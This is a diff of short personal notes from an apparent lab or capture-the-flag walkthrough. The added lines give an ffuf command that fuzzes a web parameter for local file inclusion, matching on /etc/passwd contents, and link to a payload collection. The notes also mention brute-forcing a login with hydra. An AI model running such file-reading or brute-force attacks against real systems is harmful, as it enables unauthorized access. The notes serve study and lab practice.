@@ -31,4 +31,10 @@ Then I know that it is not admin account, so I will go to /user/1
 
 I will try with hydra again for login
 
-/usr/share/wordlists/SecLists/Fuzzing/LFI
+ffuf -u "http://10.48.170.191/?skin=FUZZ" \
+
+  -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
+
+  -mr "root:x:0:0" -t 50 -o lfi_hits.json
+
+This Github Repo is Good:  [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
